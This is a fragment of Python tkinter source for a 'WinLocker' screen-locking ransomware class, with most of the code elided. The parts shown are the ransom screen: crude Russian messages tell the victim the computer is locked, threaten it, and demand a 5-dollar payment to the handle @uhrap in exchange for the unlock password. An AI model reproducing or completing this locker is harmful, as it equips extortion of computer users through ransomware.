...
class WinLocker:
    def __init__(self, master):
        ...
        tk.Label(self.master, text="твоя хуйня заблокирована кидай деньги @uhrap ", font=(font_family, 50), fg=fg_color, bg=bg_color).pack(pady=50)
        ...
        tk.Label(self.master, text="Вводи пароль или твоя хуйня ебанет .", font=(font_family, 20), fg=fg_color, bg=bg_color).pack(pady=10)
    ...
    def show_hint(self):
        messagebox.showinfo("Получения пароля разблокировки", "перевести 5 доларов @uhrap : )")
